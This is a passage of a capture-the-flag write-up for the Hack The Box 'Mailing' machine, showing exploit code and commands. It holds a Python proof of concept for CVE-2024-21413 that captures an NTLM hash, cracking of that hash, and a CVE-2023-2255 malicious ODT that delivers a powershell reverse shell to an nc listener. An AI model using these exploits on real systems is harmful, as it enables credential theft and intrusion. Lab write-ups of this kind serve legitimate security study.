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"
+
+    html = f"""\
+    &lt;html&gt;
+    &lt;body&gt;
+        &lt;h1&gt;&lt;a href="file:///{link_url}!poc"&gt;Congratulations. You won an iPhone 15.&lt;/a&gt;&lt;/h1&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+    """
+
+    part1 = MIMEText(text, 'plain')
+    part2 = MIMEText(html, 'html')
+    msg.attach(part1)
+    msg.attach(part2)
+
+    try:
+        with smtplib.SMTP(smtp_server, port) as server:
+            server.ehlo()
+            server.login(username, password)
+            server.sendmail(sender_email, recipient_email, msg.as_string())
+            print(f"{GREEN}✅ Email sent successfully.{ENDC}")
+    except Exception as e:
+        print(f"{RED}❌ Failed to send email: {e}{ENDC}")
+
+def main():
+    display_banner()
+    parser = argparse.ArgumentParser(description="PoC for CVE-2024-21413 with SMTP authentication.")
+    parser.add_argument('--server', required=True, help="SMTP server hostname or IP")
+    parser.add_argument('--port', type=int, default=587, help="SMTP server port")
+    parser.add_argument('--username', required=True, help="SMTP server username for authentication")
+    parser.add_argument('--password', required=True, help="SMTP server password for authentication")
+    parser.add_argument('--sender', required=True, help="Sender email address")
+    parser.add_argument('--recipient', required=True, help="Recipient email address")
+    parser.add_argument('--url', required=True, help="Malicious path to include in the email")
+    parser.add_argument('--subject', required=True, help="Email subject")
+
+
+    args = parser.parse_args()
+
+    send_email(args.server, args.port, args.username, args.password, args.sender, args.recipient, args.url, args.subject)
+
+if __name__ == "__main__":
+    if len(sys.argv) == 1:
+        display_banner()
+        sys.exit(1)
+    main()
+</code></pre>
+
+<p>Now I will run it again and it works:</p>
+
+<pre><code class="language-bash">❯ python3 CVE-2024-21413.py --server mailing.htb --port 25 --username 'Administrator@mailing.htb' --password homenetworkingadministrator --sender 'Administrator@mailing.htb' --recipient 'maya@mailing.htb' --url '\\10.10.14.106\test\test.txt' --subject 'Congratulations maya!'
+
+CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
+Alexander Hagenah / @xaitax / ah@primepage.de
+
+✅ Email sent successfully.
+</code></pre>
+
+<p>And I also receive the ntlm hash of maya:</p>
+
+<pre><code class="language-bash">[*] Incoming connection (10.10.11.14,53224)
+[*] AUTHENTICATE_MESSAGE (MAILING\maya,MAILING)
+[*] User MAILING\maya authenticated successfully
+[*] maya::MAILING:aaaaaaaaaaaaaaaa:47fcbe618358e75c741291cb185f4003:0101000000000000006b8f5de1fdda017a6cb09eb8345e9e0000000001001000700047005100480047007a006a00790003001000700047005100480047007a006a007900020010006a0075006600650055006c004a006600040010006a0075006600650055006c004a00660007000800006b8f5de1fdda0106000400020000000800300030000000000000000000000000200000f7b7ba203446d97ceda7a9efe47bfdfaeec949476bba07cb494c1f8e9a7811b00a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100300036000000000000000000
+</code></pre>
+
+<p>Now I will crack it and I have the password for maya:</p>
+
+<pre><code class="language-bash">❯ john -w=/usr/share/wordlists/rockyou.txt maya.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+m4y4ngs4ri       (maya)     
+1g 0:00:00:03 DONE (2024-09-03 12:02) 0.3267g/s 1938Kp/s 1938Kc/s 1938KC/s m61405..m4895621
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+
+<p>This credential should work for smb and its the case:</p>
+
+<pre><code class="language-bash">❯ netexec smb 10.10.11.14 -u 'maya' -p 'm4y4ngs4ri'
+SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri
+</code></pre>
+
+<p>And also for winrm, so I can access to Mailing machine:</p>
+
+<pre><code class="language-bash">❯ netexec winrm 10.10.11.14 -u 'maya' -p 'm4y4ngs4ri'
+WINRM       10.10.11.14     5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING)
+WINRM       10.10.11.14     5985   MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
+</code></pre>
+
+<pre><code class="language-bash">❯ evil-winrm -i 10.10.11.14 -u 'maya' -p 'm4y4ngs4ri'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\maya\Documents&gt; 
+</code></pre>
+
+<p>The user flag is available in maya’s Desktop:</p>
+
+<pre><code class="language-bash">*Evil-WinRM* PS C:\Users\maya\Documents&gt; cd ..\Desktop
+*Evil-WinRM* PS C:\Users\maya\Desktop&gt; dir
+
+
+    Directory: C:\Users\maya\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         2/28/2024   7:34 PM           2350 Microsoft Edge.lnk
+-ar---          9/3/2024  10:58 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\maya\Desktop&gt; type user.txt
+99****************************d6
+</code></pre>
+    
+      <h1 id="access-as-localadmin">
+        
+        
+          Access as localadmin <a href="#access-as-localadmin" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Looking at files, I can see in C: an empty folder called “Important Documents”:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; dir
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         4/10/2024   5:32 PM                Important Documents
+d-----         2/28/2024   8:49 PM                inetpub
+d-----         12/7/2019  10:14 AM                PerfLogs
+d-----          3/9/2024   1:47 PM                PHP
+d-r---         3/13/2024   4:49 PM                Program Files
+d-r---         3/14/2024   3:24 PM                Program Files (x86)
+d-r---          3/3/2024   4:19 PM                Users
+d-----         4/29/2024   6:58 PM                Windows
+d-----         4/12/2024   5:54 AM                wwwroot
+
+
+*Evil-WinRM* PS C:\&gt; dir "Important Documents"
+</code></pre>
+
+<p>What if some user of the machine open a document inside this folder? Looking for programs used to open documents I can see libreoffice:</p>
+
+<pre><code class="language-bash">*Evil-WinRM* PS C:\&gt; dir "Program Files"
+
+
+    Directory: C:\Program Files
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+&lt;..SNIP&gt;
+d-----          3/4/2024   6:57 PM                LibreOffice
+&lt;..SNIP..&gt;
+</code></pre>
+
+<p>Which has version 7.4.0.1:</p>
+
+<pre><code class="language-bash">*Evil-WinRM* PS C:\&gt; cd "Program Files/LibreOffice"
+*Evil-WinRM* PS C:\Program Files\LibreOffice&gt; dir
+
+
+    Directory: C:\Program Files\LibreOffice
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          3/4/2024   6:57 PM                help
+d-----          3/4/2024   6:57 PM                presets
+d-----         3/14/2024   4:01 PM                program
+d-----          3/4/2024   6:57 PM                readmes
+d-----          3/4/2024   6:57 PM                share
+-a----         6/10/2022   4:14 PM        1807470 CREDITS.fodt
+-a----          7/7/2022   1:05 PM         574491 LICENSE.html
+-a----          7/7/2022   1:09 PM         503055 license.txt
+-a----          7/6/2022  11:40 PM           3706 NOTICE
+
+
+*Evil-WinRM* PS C:\Program Files\LibreOffice&gt; cd program
+*Evil-WinRM* PS C:\Program Files\LibreOffice\program&gt; .\soffice.com --version
+LibreOffice 7.4.0.1 43e5fcfbbadd18fccee5a6f42ddd533e40151bcf
+</code></pre>
+
+<p>Looking for vulnerabilities <a href="https://www.libreoffice.org/about-us/security/advisories/">here</a> affecting this version, I saw <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-2255">CVE-2023-2255</a>, which allows loading an external resource without consent:</p>
+
+<p><img src="/assets/images/Mailing/cve-2023-2255.png" alt="cve 2023 2255" /></p>
+
+<p>There is an exploit <a href="https://github.com/elweth-sec/CVE-2023-2255">here</a> that allows crafting a malicious odt with command execution:</p>
+
+<p><img src="/assets/images/Mailing/libreoffice-odt-exploit.png" alt="libreoffice odt exploit" /></p>
+
+<p>I will clone it and generate an odt that gives me a reverse shell generated with <a href="https://revshells.com">revshells.com</a>:</p>
+
+<p><img src="/assets/images/Mailing/payload-revshells.com.png" alt="payload revshells.com" /></p>
+
+<pre><code class="language-bash">❯ git clone https://github.com/elweth-sec/CVE-2023-2255
+Cloning into 'CVE-2023-2255'...
+remote: Enumerating objects: 10, done.
+remote: Counting objects: 100% (10/10), done.
+remote: Compressing objects: 100% (8/8), done.
+remote: Total 10 (delta 2), reused 5 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (10/10), 8.47 KiB | 8.47 MiB/s, done.
+Resolving deltas: 100% (2/2), done.
+❯ cd CVE-2023-2255
+❯ python3 CVE-2023-2255.py --cmd 'powershell -e &lt;base64 encoded powershell&gt;' --output important-document.odt
+File important-document.odt has been created !
+</code></pre>
+
+<p>Now I will start a nc listener on the port I specified and transfer the document to the machine for in case somebody opens it, receive the shell:</p>
+
+<p><strong>Attacker commands</strong>:</p>
+<pre><code class="language-bash">❯ rlwrap nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<p><strong>Victim command to transfer the file from my web server</strong>:</p>
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Important Documents&gt; curl.exe http://10.10.14.106/important-document.odt -o important-document.odt
+</code></pre>
+
+<p>And I receive shell as localadmin which belongs to the “Administradores” group (Administrators in spanish):</p>
+
+<pre><code class="language-powershell">connect to [10.10.14.106] from (UNKNOWN) [10.10.11.14] 58067
+
+PS C:\Program Files\LibreOffice\program&gt; whoami
+mailing\localadmin
+PS C:\Program Files\LibreOffice\program&gt; net user localadmin
+User name                    localadmin
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2024-02-27 9:38:45 PM
+Password expires             Never
+Password changeable          2024-02-27 9:38:45 PM
+Password required            No
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   2024-09-04 10:37:33 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administradores      
+Global Group memberships     *Ninguno              
+The command completed successfully.
+</code></pre>
+
+<p>And the root flag is available in localadmin’s desktop:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\LibreOffice\program&gt; cd C:\Users
+PS C:\Users&gt; dir
+
+
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----        2024-02-28   8:50 PM                .NET v2.0                                                            
+d-----        2024-02-28   8:50 PM                .NET v2.0 Classic                                                    
+d-----        2024-02-28   8:50 PM                .NET v4.5                                                            
+d-----        2024-02-28   8:50 PM                .NET v4.5 Classic                                                    
+d-----        2024-02-28   8:50 PM                Classic .NET AppPool                                                 
+d-----        2024-03-09   1:52 PM                DefaultAppPool                                                       
+d-----        2024-03-04   8:32 PM                localadmin                                                           
+d-----        2024-02-28   7:34 PM                maya                                                                 
+d-r---        2024-03-10   4:56 PM                Public                                                               
+
+
+PS C:\Users&gt; cd localadmin
+PS C:\Users\localadmin&gt; cd Desktop
+PS C:\Users\localadmin\Desktop&gt; type root.txt
+83****************************32
+</code></pre>
+
+<p>That’s the machine of today. Hope you liked it!</p>
+
+
+<div id="share-links">
+  <span id="divider-line">____</span>
+  <br><br>
+  <small>7 September 2024</small>
+  <div>
+    
+    Tags:
+    
+    <a href="/search?q=lfi" class="tag" style="font-family: 'Cascadia Code';">lfi</a>
+    
+    <a href="/search?q=hMailServer" class="tag" style="font-family: 'Cascadia Code';">hMailServer</a>
+    
+    <a href="/search?q=hMailServer-configuration" class="tag" style="font-family: 'Cascadia Code';">hMailServer-configuration</a>
+    
+    <a href="/search?q=hash-cracking" class="tag" style="font-family: 'Cascadia Code';">hash-cracking</a>
+    
+    <a href="/search?q=outlook-vulnerabilities" class="tag" style="font-family: 'Cascadia Code';">outlook-vulnerabilities</a>
+    
+    <a href="/search?q=CVE-2024-21413" class="tag" style="font-family: 'Cascadia Code';">CVE-2024-21413</a>
+    
+    <a href="/search?q=ntlm-hash" class="tag" style="font-family: 'Cascadia Code';">ntlm-hash</a>
+    
+    <a href="/search?q=libreoffice-odt-exploit" class="tag" style="font-family: 'Cascadia Code';">libreoffice-odt-exploit</a>
+    
+    <a href="/search?q=CVE-2023-2255" class="tag" style="font-family: 'Cascadia Code';">CVE-2023-2255</a>
+    
+    
+</div>
+  <br>
+  Share this writeup:&nbsp;
+  <a
+    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/HTB/Mailing.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-facebook-official" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/HTB/Mailing.html&text=Writeup+for+HTB Mailing writeup+from+HTB+held+on+07 September 2024&hashtags=ctf,writeup,Mailing,HTB,lfi,hMailServer,hMailServer-configuration,hash-cracking,outlook-vulnerabilities,CVE-2024-21413,ntlm-hash,libreoffice-odt-exploit,CVE-2023-2255','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/HTB/Mailing.html&text=Writeup+for+HTB Mailing writeup+from+HTB+held+on+2024-09-07 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-linkedin" aria-hidden="true"></i></a>
+</div>
+    </section>
+  </div>
+
+  <div id="comments" class="container">
+    <section id="disqus_container">
+      
+    </section>
+  </div>
+
+  <footer>
+    <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+  </footer>
+
+  <script src="http://localhost:4000/assets/js/prism.js"></script>
+  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
+  <script>
+    topScroll = document.getElementById("top");
+
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+        topScroll.style.display = "block";
+      } else {
+        topScroll.style.display = "none";
+      }
+    }
+
+    function topFunction() {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    }
+
+    $(window).on('load', function () {
+
+      $('a[download]').each((i, e) => {
+        $(e).addClass('fa fa-download');
+      });
+
+      setSizes();
+    });
+
+    $(window).resize(setSizes);
+
+    function setSizes() {
+      if ($(window).width() < 960) {
+        $('#bottom-bar').hide();
+        $('footer').show();
+        $('#navbarSupportedContent').css('max-height', 'unset');
+        $('.navbar-collapse').collapse('hide');
+        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
+          $('footer').css("position", "unset");
+        } else {
+          $('footer').css("position", "fixed");
+        }
+      }
+      else {
+        $('#bottom-bar').show();
+        $('footer').hide();
+        $('.navbar-collapse').collapse('hide');
+        $('footer').css("position", "fixed");
+        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
+      }
+    }
+  </script>
+
+</body>
+
+</html>
